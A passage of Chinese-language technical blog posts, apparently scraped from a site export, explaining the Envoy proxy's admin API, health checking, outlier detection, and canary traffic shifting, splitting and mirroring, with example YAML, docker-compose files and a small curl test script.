rq_total Counter Total requests rq_timeout Counter Total timed out requests rq_success Counter Total requests with non-5xx responses rq_error Counter Total requests with 5xx responses rq_active Gauge Total active requests healthy String The health status of the host. See below weight Integer Load balancing weight(1-100) zone String Service zone canary Boolean Whether the host is a canary success_rate Double Request success rate (0-100). -1 if there was not enough request volume in the interval to calculate it 示例总结\nGET /clusters ：列出所有已配置的集群，包括每个集群中发现的所有上游主机以及每个主机的统计信息；支持输出为json格式； 集群管理器信息：version_info string，无CDS时，则显示为 version_info::static 集群相关的信息：断路器、异常点检测和用于表示是否通过CDS添加的标识 add_via_api 每个主机的统计信息：包括总连接数、活动连接数、总请求数和主机的健康状态等；不健康的原因通常有以下三种： √ filed_activehc：未通过主动健康状态检测； √ failed_edshelth：被EDS标记为不健康； √ failed_outlier_check：未通过异常检测机制的检查； GET /listeners ：列出所有已配置的侦听器，包括侦听器的名称以及监听的地址；支持输出为json格式； POST /reset_counters ：将所有计数器重围为0；不过，它只会影响Server本地的输出，对于已经发送到外部存储系统的统计数据无效； GET /config_dump ：以json格式打印当前从Envoy的各种组件加载的配置信息； GET /ready ：获取Server就绪与否的状态，LIVE状态为200，否则为503； ","permalink":"https://www.oomkill.com/2020/09/envoy-administartion/","summary":"","title":"Envoy管理"},{"content":"服务网格的基本功能\n控制服务间通信：熔断、重试、超时、故障注入、负载均衡和故障转移等。 服务发现：通过专用的服务总监发现服务端点。 可观测：指标数据采集、监控、分布式日志记录和分布式追踪。 安全性：TLS/SSL通信和秘钥管理。 身份认证和授权检查：身份认证，以及基于黑白名单或RBAC的访问控制功能。 部署：对容器技术的原生支持，例如Docker和Kubernetes等。 服务间的通信协议：HTTP1.1 HTTP2.0和gRPC等。 健康状态监测：监测上游服务的健康状态。 \u0026hellip;. 服务网格的部署模式有两种：主机共享代理和Sidecar容器\n主机共享代理 适用于同一主机存在许多容器的场景，并且还可以利用连接池来提高吞吐量。 带一个代理进程故障将终止其所在主机上的整个容器队列，受影响的不仅仅是单个服务。 实现方式中，常见的是允许为Kubernetes之上的 DaemonSet。 Sidecar容器 代理进程注入每个Pod定义以与住容器一同运行。 Sidecar进程应该尽可能轻量且功能完善。 实现方案：Linkerd、Envoy和Conduit。 What IS Enovy Enovy是工作与OSI模型的7层代理\n在实现上，数据平面的主流解决方案有Linkerd、Nginx、Envoy、HAProxy和Traefik等，而控制平面的实现主要有Istio、Nelson和SmartStack等几种口Linkerd ●由Buoyant公司于2016年率先创建的开源高性能网络代理程序（数据平面），是业界第一款Service Mesh产品，引领并促进了相关技术的快速发展 ·Linkerd使用Namerd提供控制平面，实现中心化管理和存储路由规则、服务发现配置、支持运行时动态路由等功能\nEnvoy\n核心功能在于数据平面，于2016年由Lyft公司创建并开源，目标是成为通用的数据平面\n云原生应用，既可用作前端代理，亦可实现Service Mesh中的服务间通信\nEnvoy常被用于实现APIGateway（如Ambassador）以及Kubernetes的Ingress Controller（例如gloo等），不过，基于Envoy实现的Service Mesh产品Istio有着更广泛的用户基础\nIstio ·相比前两者来说，lstio发布时间稍晚，它于2017年5月方才面世，但却是目前最火热的Service Mesh解决方案，得到了Google、IBM、Lyt及Redhat等公司的大力推广及支持 ·目前仅支持部署在Kubernetes之上，其数据平而由Envoy实现\nenvoy适用于现代大型面向服务架构的动态组织应用程序的7层代理应用程序，其典型特性：\n运行在架构进程之外 支持3/4层过滤器 支持HTTP协议7层过滤器 支持HTTP协议7层高级路由功能 envoy在现代服务体系架构当中的适用位置既可以为一组服务提供代理，作为整个服务统一的api网关来进行接入，同时也可以对每一个微服务单独实现作为代理，此时需要以sidecar的形式运行在应用程序前端。进而与最前端的apigateway组织成所谓的服务网格（Sevice Mesh）。而在每一个Envoy实例内部都要接受请求。这个请求可能是来自互联网或服务网格之外的客户端，称之为南北流量；也可能是来自网格当中的其他服务的请求，称之为东西流量。\n在Envoy当中类似于Nginx或者haproxy的功能术语：\nlisteners ：面向客户端一侧提供监听并接受客户端请求的组件。类似于nginx的server或haproxy的frontend 。 cluster：面向后端测，将多个被代理的实例分成组，统一进行负载均衡调度的组。 cluster definltions：cluster的归类。 filter chains：过滤器链，可以将多个链以流水线方式依次进行处理。 面向客户端提供服务/监听的套接字，lintener内部包含一到多个filter组成filter chains，称之为过滤器链。过滤器是lintener内部的子组件。envoy支持4层过滤器和7层过滤器。\nenvoy 术语\n主机（Host）：能够进行网络通信的实体（如手机，服务器等上的应用程序）。在这个文档中，主机是一个逻辑网络应用程序。一个物理硬件可能有多个主机上运行，只要他们可以独立寻址。\n下游（Downstream）：下游主机连接到Envoy，发送请求并接收响应。\n上游（Upstream）：上游主机接收来自Envoy的连接和请求并返回响应。\n监听器（Listener）：侦听器是可以被下游客户端连接的命名网络位置（例如，端口，unix域套接字等）。Envoy公开一个或多个下游主机连接的侦听器。 filters chains，过滤器链L4/L7 route：完成对客户请求进行分类 群集（Cluster）：群集是指Envoy连接到的一组逻辑上相似的上游主机。Envoy通过服务发现发现一个集群的成员。它可以通过主动健康检查来确定集群成员的健康度，从而Envoy通过负载均衡策略将请求路由到相应的集群成员。\n网格（Mesh）：协调一致以提供一致的网络拓扑的一组主机。在本文档中，“Envoy mesh”是一组Envoy代理，它们构成了由多种不同服务和应用程序平台组成的分布式系统的消息传递基础。\n运行时配置（Runtime configuration）：与Envoy一起部署的外置实时配置系统。可以更改配置设置，可以无需重启Envoy或更改主要配置。\nenovy的部署类型 仅用于service到service之间的通讯，对应的Enovy工作为\negress listener ingress listener optional exteral service egress listeners ","permalink":"https://www.oomkill.com/2020/09/envoy-fundamental/","summary":"","title":"Envoy基础"},{"content":"官方文档 healthy_check\nEnvoy的服务发现并未采用完全一致的机制，而是假设主机以最终一致的方式加入或离开网格，它结合主动健康状态检查机制来判定集群的健康状态；\n健康与否的决策机制以完全分布式的方式进行，因此可以很好地应对网络分区； 为集群启用主机健康状态检查机制后，Envoy基于如下方式判定是否路由请求到一个主机； 发现失败，单健康检查正常，此时，无法添加新主机，但现有主机将继续正常运行。 Discovery Status Health Check OK Health Check Failed Discovered Route Dont\u0026rsquo;t Route Absent Route Don\u0026rsquo;t Route / Delete 故障处理机制 Envoy提供了一系列开箱即用的故障处理机制：\n超时（timeout） 有限次数的重试，并支持可变的重试延迟 主动健康检查与异常探测 连接池 断路器 所有这些特性，都可以在运行时动态配置；结合流量管理机制，用户可为每个服务/版本定制所需的故障恢复机制；\n健康状态监测 健康状态检测用于确保代理服务器不会将下游客户端的请求代理至工作异常的上游主机；\nEnvoy支持两种类型的健康状态检测，二者均基于集群进行定义：\n主动检测（Active Health Checking）：Envoy周期性地发送探测报文至上游主机，并根据其响应判断其健康状态；Envoy目前支持三种类型的主动检测：\nHTTP：向上游主机发送HTTP请求报文 L3/L4：向上游主机发送L3/L4请求报文，基于响应的结果判定其健康状态，或仅通过连接状态进行判定； Redis：向上游的redis服务器发送Redis PING； 被动检测（Passive Health Checking）：Envoy通过异常检测（Outlier Detection）机制进行被动模式的健康状态检测；\n目前，仅htp router、tcp proxy和redis proxy三个过滤器支持异常值检测；\nEnvoy支持以下类型的异常检测：\n连续5XX：意指所有类型的错误，非htp router过滤器生成的错误也会在内部映射为5xx错误代码； 连续网关故障：连续5XX的子集，单纯用于http的502、503或504错误，即网关故障； 连续的本地原因故障：Envoy无法连接到上游主机或与上游主机的通信被反复中断； 成功率：主机的聚合成功率数据阀值； 主动健康状态监测 集群的主机健康状态检测机制需要显式定义，否则，发现的所有上游主机即被视为可用；\n定义语法\nclusters:\r- name:\r..\rload_assignment:\rendpoints:\r- lb_endpoints:\r- endpoint:\rhealth_check_config:\rport_value: .. # 自定义健康状态监测是使用的端口。\r...\rhealth_checks:\r- timeout: ... # 超时时长\rinterval: ... # 时间间隔\rinitial_jitter: ... # 初始监测时间点散开量，以毫秒为单位\rinterval_jitter: .. # 间隔监测时间点散开量，以毫秒为单位\runhealthy_threshold: ... # 将主机标记为不建行状态监测阈值，即至少多少次不健康的监测后才将其标记为不可用\rhealty_threshold: ... # 将主机标位健康状态的监测阈值，单初始监测成功一次视为健康\rhttp_helth_check: {} # HTTP类型的监测，包括此种类型在内的一下四种检测类型必须设置一种。\rtcp_health_check: {} # TCP类型的监测。\rgrpc_health_check: {}\t# GRPC专用的监测\rcustom_health_check: {} # 自定义监测\rreuse_connection: ... # 布尔型值，是否在多次监测之间重用连接，默认值true\rno_traffic_interval: ... # 定义未曾调度任何流量值集群时，其端点健康监测时间间隔，一旦其接受流量即转为正常的时间间隔\runhealthy_interval: ... # 标记为 unhealthy 状态的端点的健康监测时间间隔，一但重新标记为 “health”，即转为正常时间间隔。\runhealthy_edge_interval: ... # 端点刚被标记为 unhealthy 状态时的健康监测时间间隔，随后转为unhealthy_interval的定义。\rhealthy_edge_interval: ... # 端点刚被标记为 healthy 状态时的健康监测时间间隔，随后即转为interval的定义。\r主动健康监测:TCP tcp类型监测\nclusters:\r- name: local_service\rconnect_timeout: 0.25s\rlb_policy: ROUND_ROBIN\rtype: EDS\reds_cluster_config:\reds_config:\rapi_config_source:\rapi_type: GRPC\rgrpc_services:\r- envoy_grpc:\rcluster_name: xds_cluster\rhealth_checks:\r- timeout: 5s\rinterval: 10s\runhealthy_threshold: 2\rhealthy_threshod: 2\rtcp_health_check: {}\r空负载的tcp检测意味着仅通过连接状态判定其检测结果;\n非空负载的cp检测可以使用send和receive来分别指定请求负荷及于响应报文中期望模糊匹配的结果;\n主动健康监测:HTTP http类型的检测可以自定义使用的 path、host和期望的响应码等，并能够在必要时修改（添加/删除）请求报文的标头\n具体配置语法如下\nhealthy_checks: []\r- ...\rhttp_health_check:\r\u0026quot;host\u0026quot;: .. # 检测时使用的主机头，默认为空，此时使用集群名称。\r\u0026quot;path\u0026quot;: .. # 检测时使用的路径，例如 /healthz。必选参数\r\u0026quot;server_name\u0026quot;: # 用于验证监测目标集群的服务名称参数，可选；\r\u0026quot;request_headers_to_add\u0026quot;: [] # 想监测报文添加自定义标头列表；\r\u0026quot;request_headers_to_add\u0026quot;: [] # 从监测报文中移除标头列表。\r\u0026quot;use_http2\u0026quot;: # 是否使用http2协议\r\u0026quot;expected_statuses\u0026quot;: [] # 期望的响应码列表\r配置示例\nclusters:\r- name: local_service\rconnect_timeout: 0.25s\rlb_policy: ROUND_ROBIN\rtype: EDS\reds_cluster_config:\reds_config：\rapi_config_source:\rapi_type: GRPC\rgrpc_services:\r- envoy_grpc:\rcluster_name: xds_cluster\rhealthy_checks:\r- timeout: 5s\rinterval: 10s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rhost: .. # 默认为空值，并且自动使用集群为其值；\rpath: .. # 监测针对的路径，例如/healthz;\rexpected_statuses: .. # 期望的响应码，默认200\rversion: '3'\rservices:\renvoy:\rimage: envoyproxy/envoy-alpine:v1.15-latest\renvironment: - ENVOY_UID=0\r- HEALTHY=ok\rports:\r- 80:80\r- 443:443\r- 82:9901\rvolumes:\r- ./envoy.yaml:/etc/envoy/envoy.yaml\r- ./certs:/etc/envoy/certs\rnetworks:\renvoymesh:\raliases:\r- envoy\rdepends_on:\r- webserver1\r- webserver2\rwebserver1:\rimage: sealloong/envoy-end:latest\renvironment: - COLORFUL=blue\r- HEALTHY=ok\rnetworks:\renvoymesh:\raliases:\r- myservice\r- webservice\rexpose:\r- 90\rwebserver2:\rimage: sealloong/envoy-end:latest\renvironment: - COLORFUL=blue\rnetworks:\renvoymesh:\raliases:\r- myservice\r- webservice\rexpose:\r- 90 networks:\renvoymesh: {}\rstatic_resources:\rlisteners:\r- name: listener_0\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 80 }\rfilter_chains:\r- filters:\r- name: envoy_http_connection_manager\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\rstat_prefix: ingress_http\rcodec_type: AUTO\rroute_config:\rname: local_route\rvirtual_hosts:\r- name: local_service\rdomains: [ \u0026quot;*\u0026quot; ]\rroutes:\r- match: { prefix: \u0026quot;/\u0026quot; }\rroute: { cluster: local_service }\rhttp_filters:\r- name: envoy.filters.http.router\rclusters:\r- name: local_service\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: local_service\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: webservice, port_value: 90 }\rhealth_checks:\rtimeout: 1s\rinterval: 2s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses: 200\r异常主机驱逐机制 确定主机异常一\u0026gt;若尚未驱逐主机，且已驱逐的数量低于允许的阀值，则已经驱逐主机一\u0026gt;主机处于驱逐状态一定时长一\u0026gt;超出时长后自动恢复服务。\n异常探测通过outlier_dection字段定义在集群上下文中\nclusters:\r- name: ...\r...\routlier_detection:\rconsecutive_5xx: .. # 因连续5xx错误而弹出主机之前，允许出现的连续5xx相应或本地原始错误数量，默认5\rinterval: # 弹射分析臊面之间的时间间隔，默认为 10000ms或10s\rbase_ejection_time: # 主机被弹出的基准时长，实际时长=基准时长*主机已弹出的次数；默认为30s\rmax_ejection_percent: # 因一场探测而允许弹出的上游集群中的主机数量百分比，默认为10%，无论如何至少弹出一个主机。\renforcing_consecutive_5xx: # 基于连续的5xx检查到主机异常时主机将被弹出的几率，可用于禁止弹出或缓慢弹出。默认100\rsuccess_rate_minimum_hosts: # 对集群启动成功率异常监测的最少主机数。默认5\rsuccess_rate_stdev_volume: # 在监测的一次时间间各种，必须收集的请求总数的最小值，默认100\rsuccess_rate_stdev_factor: # 用确定成功率异常值弹出的弹射阈值的因子： 弹射阈值=均值-(因子*平均成功率标准差)；不过，此处设置的值需要除以1000以得到因子，例如使用1.3 时需要将该参数值设置为1300。\rconsecutive_gateway_failure: # 因连续网关故障而天厨主机的最少连续故障数，默认5\renforcing_consecutive_gateway_failure: # 基于连续网关故障检测时而弹出主机的几率的百分比，默认0\rsplit_external_local_origin_error: # 是否区分本地原因而导致的故障和外部故障，默认为false，设置为true时，一下三项生效：\rconsective_local_origin_failure: # 本地原因故障而弹出主机的最少故障次数，默认5\renforcing_consecutive_local_ogrgin_failure: # 基于连续的本地故障检测到异常状态而弹出主机的几率百分比。默认100\r# enforcing_local_origin_success_rate: # 基于本地故障检测地成功率统计检测到异常状态而弹出主机的几率，默认100\r同主动健康检查一样，异常检测也要配置在集群级别；下面的示例用于配置在返回3个连续5xx错误时将主机弹出30秒;\nconsecutive_5xx: \u0026quot;3\u0026quot;\rbase_ejection_time: \u0026quot;30s\u0026quot;\r在新服务上启用异常检测时应该从不太严格的规则集开始，以便仅弹出具有网关连接错误的主机（HTTP503），并且仅在10%的时间内弹出它们;\nconsecutive_gateway_failure: 3\rbase_ejection_time: \u0026quot;30s\u0026quot;\renforcing_consecutive_gateway_failure: \u0026quot;10\u0026quot;\r同时，高流量、稳定的服务可以使用统计信息来弹出频繁异常容的主机；下面的配置示例将弹出错误率低于群集平均值1个标准差的任何端点，统计信息每10秒进行一次评估，并且算法不会针对任何在10秒内少于500个请求的主机运行\ninterval: \u0026quot;10s\u0026quot;\rbase_ejection_time: \u0026quot;30s\u0026quot;\rsuccess_rate_minimum_hosts: \u0026quot;10\u0026quot;\rsuccess_rate_request_volume: \u0026quot;500\u0026quot;\rsuccess_rate_stdev_factor: \u0026quot;1000\u0026quot;\r离群值检测:HTTP docker-compose\nversion: '3'\rservices:\renvoy:\rimage: envoyproxy/envoy-alpine:v1.15-latest\renvironment: - ENVOY_UID=0\rports:\r- 80:80\r- 443:443\r- 82:9901\rvolumes:\r- ./envoy.yaml:/etc/envoy/envoy.yaml\rnetworks:\renvoymesh:\raliases:\r- envoy\rdepends_on:\r- webserver1\r- webserver2\rwebserver1:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- myservice\r- webservice\rexpose:\r- 90\rwebserver2:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- myservice\r- webservice\rexpose:\r- 90\rwebserver3:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- myservice\r- webservice\rexpose:\r- 90\rwebserver4:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- myservice\r- webservice\rexpose:\r- 90\rwebserver5:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- myservice\r- webservice\rexpose:\r- 90\rnetworks:\renvoymesh: {}\r","permalink":"https://www.oomkill.com/2020/09/envoy-health-check/","summary":"","title":"Envoy健康状态监测"},{"content":"灰度发布 概述 新版本上线时，无论是出于产品稳定性还是用户接受程度等方面因素的考虑，直接以新代旧都充满风险；于是，通行做法是新老版本同时在线，且一开始仅分出较小比例的流量至新版本，待确认新版本没问题后再逐级加大流量切换。\n灰度发布是迭代的软件产品在生产环境安全上线的一种重要手段，对于Envoy来说，灰度发布仅是流量治理的一种典型应用；以下是几种常见的场景口金丝雀发布\n- 蓝绿发布\r- A/B测试\r- 流量镜像\r灰度策略 需要在生产环境发布一个新的待上线版本时，需要事先添加一个灰度版本，而后将原有的生产环境的默认版本的流量引流一部分至此灰度版本，配置的引流机制即为灰度策略，经过评估稳定后，即可配置此灰度版本接管所有流量，并下线老版本。\n常用的策略类型大体可分为 “基于请求内容发布”和“基于流量比例发布”两种类型\n基于请求内容发布：配置相应的请求内容规则，满足相应规则服务流量会路由到灰度版本；例如对于http请求，通过匹配特定的Cookie标头值完成引流\nCookie内容：\n完全匹配：当且仅当表达式完全符合此情况时，流量才会走到这个版本；\n正则匹配：此处需要您使用正则表达式来匹配相应的规则；\n自定义Header：\n完全匹配：当且仅当表达式完全符合此情况时，流量才会走到这个版本；\n正则匹配：此处需要您使用正则表达式来匹配相应的规则；可以自定义请求头的key和value，value支持完全匹配和正则匹配；\n基于流量比例发布：对灰度版本配置期望的流量权重，将服务流量以指定权重比例引流到灰度版本；例如10%的流量分配为新版本，90%的流量保持在老版本。这种灰度策略也可以称为AB测试；\n注：所有版本的权重之和为100；\n灰度发布的实现方式 基于负载均衡器进行灰度发布\n在服务入口的支持流量策略的负载均衡器上配置流量分布机制\n仅支持对入口服务进行灰度，无法支撑后端服务需求\n基于Kubernetes进行灰度发布\n根据新旧版本应用所在的Pod数量比例进行流量分配，不断滚动更新旧版本Pod到新版本（先增后减、先减后增、又增又减）；服务入口通常是Service或Ingress。\n基于服务网格进行灰度发布\n对于Envoy或lstio来说，灰度发布仅是流量治理机制的一种典型应用。通过控制平面，将流量配置策略分发至对目标服务的请求发起方的envoy sidecar上即可。\n支持基于请求内容的流量分配机制，例如浏览器类型、cookie等。\n服务访问入口通常是一个单独部署的Envoy Gateway。\nEnvoy中流量转移 新版本上线时，为兼顾到产品的稳定性及用户的接受程度，让新老版本同时在线，将流量按需要分派至不同的版本；\n蓝绿发布 A/B测试 金丝雀发布 流量镜像 \u0026hellip;. HTTP路由器能够将流量按比例分成两个或多个上游集群中虚拟主机中的路由，从而产生两种常见用例：\n版本升级：路由时将流量逐渐从一个集群迁移至另一个集群，实现灰度发布；\n通过在路由中定义路由相关流量的百分比进行；\nA/B测试或多变量测试：同时测试多个相同的服务，路由的流量必须在相同服务的不同版本的集群之间分配；通过在路由中使用基于权重的集群路由完成；另外，匹配条件中，结合指定标头或也能够完成基于内容的流量管理；\n流量迁移是指，通过在路由中配置运行时对象选择特定路由以及相应集群的概率的变动，从而实现将虚拟主机中特定路由的流量逐渐从一个集群迁移到另一个集群。\nruntime_fraction\nroute:\r- match:\rprefix|path|regex:\rruntime_faction:\t# 额外匹配指定的运行时键值，每次评估匹配路径时，必须低于此字段指示的百分比，支持渐进式修改。\rdefault_value: # 运行时键值不可用时，则使用此默认值。 numerator: # 指定分子，默认0\rdenominator: # 指定分母，小于分母时，最终百分比为1， 分母可使用 HUNDRED（默认） TEN_THOUSAND和MILLION，\rruntime_key: routing.traffic_shift.KEY # 要使用运行时的建，值需要用户自行定义。\rroute:\rcluster: app_v1\r- match:\rprefix|path|regex:\rroute:\rcluster: app_v2\rEnvoy基于首次匹配以短路机制 工作，若相应的路由存在runtime_fraction对象，则根据其值（或默认值）另外匹配百分比之外的其它请求；这意味着上述示例中，如果两个路由条目match条件一样，则 runtime_fraction 对象定义的百分比之外的流量将由第二个路由条目精确捕获。\n用户可以通过不断地修改 runtime_fraction 对象的值完成流量迁移；curl envoy_administration_api:9901/runtime_modify?k1=v1\u0026amp;k2=v2\nadmin:\raccess_log_path: /dev/null\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 9901 }\rstatic_resources:\rlisteners:\r- name: listener_0\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 80 }\rfilter_chains:\r- filters:\r- name: envoy_http_connection_manager\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\rstat_prefix: local_route\rcodec_type: AUTO\rroute_config:\rname: local_route\rvirtual_hosts:\r- name: base_domain\rdomains: [ \u0026quot;*\u0026quot; ]\rroutes:\r- match:\rprefix: \u0026quot;/\u0026quot;\rruntime_fraction:\rdefault_value:\rnumerator: 0\rdenominator: HUNDRED\rruntime_key: routing.traffic_shift.sv\rroute:\rcluster: app_v2\r- match: { prefix: / }\rroute: { cluster: app_v1 }\rhttp_filters:\r- name: envoy.filters.http.router\rclusters:\r- name: app_v1\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: app_v1\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: version1, port_value: 90 }\rhealth_checks:\rtimeout: 3s\rinterval: 30s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses:\rstart: 200\rend: 201\r- name: app_v2\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: app_v2\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: version2, port_value: 90 }\rhealth_checks:\rtimeout: 3s\rinterval: 30s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses:\rstart: 200\rend: 201\rdocker-compose\nversion: '3'\rservices:\renvoy:\rimage: envoyproxy/envoy-alpine:v1.15-latest\renvironment: - ENVOY_UID=0\rports:\r- 80:80\r- 443:443\r- 82:9901\rvolumes:\r- ./envoy.yaml:/etc/envoy/envoy.yaml\rnetworks:\renvoymesh:\raliases:\r- envoy\rdepends_on:\r- webserver1\r- webserver2\r- webserver3\r- webserver4\rwebserver1:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- version1\renvironment: - VERSION=v1\r- COLORFUL=blue\rexpose:\r- 90\rwebserver2:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- version1\renvironment: - VERSION=v1\r- COLORFUL=blue\rexpose:\r- 90\rwebserver3:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- version2\renvironment: - VERSION=v2\r- COLORFUL=red\rexpose:\r- 90\rwebserver4:\rimage: sealloong/envoy-end:latest\renvironment: - VERSION=v2\r- COLORFUL=red\rnetworks:\renvoymesh:\raliases:\r- version2\rexpose:\r- 90\rnetworks:\renvoymesh: {}\r测试使用的脚本\n#!/bin/bash\rdeclare -i v1=0\rdeclare -i v2=0\rdeclare -r inverval=\u0026quot;0\u0026quot;\rdeclare -i count=$2\rdeclare -i i=0\rwhile [ ${i} -lt ${count} ]\rdo\rif curl -s http://$1/version | grep \u0026quot;version£ºv2\u0026quot; \u0026amp;\u0026gt; /dev/null; then\rlet v2++\relse\rlet v1++\rfi\recho -e \u0026quot;\\033[31m[Version1:v2]\\033[0m==${v1}:${v2}\u0026quot;\rsleep $inverval\rlet i++\rdone\rEnvoy 流量分割 traffic split HTTP router过滤器支持在一个路由中指定多个上游具有权重属性的集群，而后将流量基于权重调度至此些集群其中之一。\n分配给每个集群的权重也可以使用运行时参数进行调整；\nroutes\r- match:\rroute:\rweight_clusters: cluster: [] # 与当前路由关联的一个或多个集群，required\r- name: .. # 集群的名称，是指定已存在cluster的名称，非自定义标志。\rweight: .. # 集群权重，取值范围为0~total_weight metadata_match: .. # 子集负载均衡器使用的端点元数据匹配条件，可选参数，仅用于上游及群众具有此字段中设置的元数据匹配的元数据端点以进行流量分配。\rtotal_weight: .. # 总权重值，默认100\rruntime_key_prefix: ... # 可选参数，用于设定键前缀，从而每个集群以 runtime_key_prefix+.cluster[i].name 为其键名，名能够运行时键值的方式为每个集群提供权重，其中，cluster[i].name表示列表中第i个集群\r流量分流配置示例 假设存在某微服务应用，其v1和v2两个版本分别对应于appv1和appv2两个集群；\n初始权重比例为appv1承载100%，而appv2不承载任何请求；随后可通过运行时参数，将所有流量切往appv2；\n各自的权重比例可通过运行时参数动态调整：curl -XPOST http://host:admin_port/runtime_modify?routing.traffic_split.prefix.k1=0\u0026amp;routing.traffic_splic.prefix.k2=100\n与 taffic_shift 不同，Traffic splitting 只需要单个路由条目。 路由中的 weighted_clusters 配置块可用于指定多个上游群集以及指示将发送到每个上游群集的流量百分比的权重。\n配置示例\nadmin:\raccess_log_path: /dev/null\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 9901 }\rstatic_resources:\rlisteners:\r- name: listener_80\raddress:\rsocket_address: { address: 0.0.0.0, port_value: 80 }\rfilter_chains:\r- filters:\r- name: envoy_http_connection_manager\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\rhttp_filters:\r- name: envoy.filters.http.router\rstat_prefix: local_route\rcodec_type: AUTO\rroute_config:\rname: local_route\rvirtual_hosts:\r- name: split_traffic\rdomains: [ \u0026quot;*\u0026quot; ]\rroutes:\r- match: prefix: \u0026quot;/\u0026quot;\rroute:\rweighted_clusters:\rtotal_weight: 100\rruntime_key_prefix: routing.traffic_split.version\rclusters:\r- name: version_v1\rweight: 100\r- name: version_v2\rweight: 0 clusters:\r- name: version_v1\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: version_v1\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: version1, port_value: 90 }\rhealth_checks:\rtimeout: 3s\rinterval: 30s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses:\rstart: 200\rend: 201\r- name: version_v2\rconnect_timeout: 0.25s\rtype: STRICT_DNS\rlb_policy: ROUND_ROBIN\rload_assignment:\rcluster_name: version_v2\rendpoints:\r- lb_endpoints:\r- endpoint:\raddress:\rsocket_address: { address: version2, port_value: 90 }\rhealth_checks:\rtimeout: 3s\rinterval: 30s\runhealthy_threshold: 2\rhealthy_threshold: 2\rhttp_health_check:\rpath: /ping\rexpected_statuses:\rstart: 200\rend: 201\rdocker-compose\nversion: '3'\rservices:\renvoy:\rimage: envoyproxy/envoy-alpine:v1.15-latest\renvironment: - ENVOY_UID=0\rports:\r- 80:80\r- 443:443\r- 82:9901\rvolumes:\r- ./envoy.yaml:/etc/envoy/envoy.yaml\rnetworks:\renvoymesh:\raliases:\r- envoy\rdepends_on:\r- webserver1\r- webserver2\r- webserver3\r- webserver4\rwebserver1:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- version1\renvironment: - VERSION=v1\r- COLORFUL=blue\rexpose:\r- 90\rwebserver2:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- version1\renvironment: - VERSION=v1\r- COLORFUL=blue\rexpose:\r- 90\rwebserver3:\rimage: sealloong/envoy-end:latest\rnetworks:\renvoymesh:\raliases:\r- version2\renvironment: - VERSION=v2\r- COLORFUL=red\rexpose:\r- 90\rwebserver4:\rimage: sealloong/envoy-end:latest\renvironment: - VERSION=v2\r- COLORFUL=red\rnetworks:\renvoymesh:\raliases:\r- version2\rexpose:\r- 90\rnetworks:\renvoymesh: {}\rEnvoy 影子镜像 Shadow mirroring 关于影子镜像\n流量镜像，也称为流量复制或影子镜像\n流量镜像功能通常用于在生产环境进行测试，通过将生产流量镜像拷贝到测试集群或者新版本集群，实现新版本接近真实环境的测试，旨在有效地降低新版本上线的风险；\n流量镜像可用于以下场景\n验证新版本：实时对比镜像流量与生产流量的输出结果，完成新版本目标验证 测试：用生产实例的真实流量进行模拟测试 隔离测试数据库：与数据处理相关的业务，可使用空的数据存储并加载测试数据，针对该数据进行镜像流量操作，实现测试数据的隔离 假设我们要配置以下设置，其中25％的流量被影子镜像到另一个上游，可通过访问 myservice-test.mycompany.com。\n将流量转发至一个集群（主集群）的同时再转发到另一个集群（影子集群）\n无须等待影子集群返回响应。\n支持收集影子集群的常规统计信息，常用于测试具有实际生产流量的服务，而不会以任何方式影响最终客户。\nroute:\rcluster|weighted_cluster:\r..\rrequest_mirror_policies:\rcluster: ..\rtrace_sampled: # 确定是否应采样跟踪范围。默认为true。\rruntime_faction: {}\rdefault_value: # 运行时key不可用时，则使用此默认值，。\rnumerator: # 指定分子，默认0\rdenominator: # 指定坟墓，小鱼分子时，最终百分比为1，分母可固定使用HUNDRED TEN_RHOUSAND MILLION\rruntime_key: routing.request_mirror.Key # 运行时键，值需自行定义\r默认情况下，路由器会镜像所有请求；也可使用如下两个参数配置转发的流量比例\n- `runtime_key` ：运行时键，用于明确定义向影子集群转发的流量的百分比，取值范围为0-10000，每个数字表示0.01%的请求比例；定义了此键却未指定其值时，默认为0；此参数即将废弃，并下面的参数所取代；\r- 